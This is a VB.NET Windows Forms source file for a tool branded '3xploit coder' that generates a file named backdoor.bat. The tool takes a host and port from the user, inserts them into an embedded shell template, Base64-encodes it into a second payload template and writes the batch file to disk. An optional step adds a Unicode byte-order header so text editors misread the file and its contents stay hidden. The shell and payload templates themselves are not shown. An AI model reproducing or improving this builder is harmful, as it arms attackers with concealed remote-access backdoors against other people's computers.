Imports System.Text

Public Class Form1
    Dim блмацрагзаваттатуреа As New StringBuilder
    Dim alphaChars As String = "abcdefghijklmnopqrstuvwxyz"
    Dim randomGenerator As New Random

    '3xploit coder ==================================$==============================================
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Close()
    End Sub
    '3xploit coder ==================================$==============================================
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        My.Computer.Audio.Play(My.Resources.Alert, AudioPlayMode.Background)
        '3xploit coder ==================================$==============================================

        Dim a As New SaveFileDialog()
        '3xploit coder ==================================$==============================================
        a.FileName = "backdoor.bat"
        If (a.ShowDialog = Windows.Forms.DialogResult.OK) Then


            Dim f As String = My.Resources.shell
            f = f.Replace("%H%", GhostTextBox1.Text).Replace("%P%", GhostTextBox2.Text)
            Dim o = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(f))
            Dim exploit As String = My.Resources.code2
            exploit = exploit.Replace("%HHH%", o)
            TextBox1.Text = exploit
            System.IO.File.WriteAllText(a.FileName, exploit, System.Text.Encoding.ASCII)
            If GhostRadiobutton1.Checked = True Then
                ObfuscateMethod3()
                MessageBox.Show("3xploit coder complete.........")


                '3xploit coder ==================================$=============================================='3xploit coder ==================================$==============================================

            End If
        End If
    End Sub
    Private Sub ObfuscateMethod3()
        TextBox1.ReadOnly = True
        '3xploit coder ==================================$==============================================
        блмацрагзаваттатуреа.Clear() ' Make sure there is no excess code left over from last time.
        '3xploit coder ==================================$==============================================
        Dim unicodeHeader() As Byte = New Byte() {&HFF, &HFE, &HD, &HA} ' The bytes that make text editors think it's in Unicode
        Dim obfuscatedCodeByteArray() As Byte = New Byte() {} ' Declare new Byte array for our text to be obfuscated.
        obfuscatedCodeByteArray = System.Text.Encoding.ASCII.GetBytes("cls" + vbNewLine + TextBox1.Text) ' Put TextBox1.Text into byte array
        Dim concatenatedByteArray() As Byte = New Byte(unicodeHeader.Length + obfuscatedCodeByteArray.Length) {} ' Make new array to combine header and code

        unicodeHeader.CopyTo(concatenatedByteArray, 0) ' Copy header to full byte array
        obfuscatedCodeByteArray.CopyTo(concatenatedByteArray, unicodeHeader.Length) ' Copy obfuscated code after the header

        TextBox1.ReadOnly = False
        ' Need a custom save function because have to write raw bytes to disk.
        If SaveFileDialog1.ShowDialog() = DialogResult.OK Then
            IO.File.WriteAllBytes(SaveFileDialog1.FileName, concatenatedByteArray) ' Write raw bytes, not just text, to the disk.
        Else
            Return
        End If
    End Sub
    '3xploit coder ==================================$==============================================
    Private Function SaveFile() As Boolean ' Returns true if DialogResult OK, false otherwise
        If SaveFileDialog1.ShowDialog() = DialogResult.OK Then
            IO.File.WriteAllText(SaveFileDialog1.FileName, блмацрагзаваттатуреа.ToString)
            Return True
        Else
            Return False
        End If
    End Function
End Class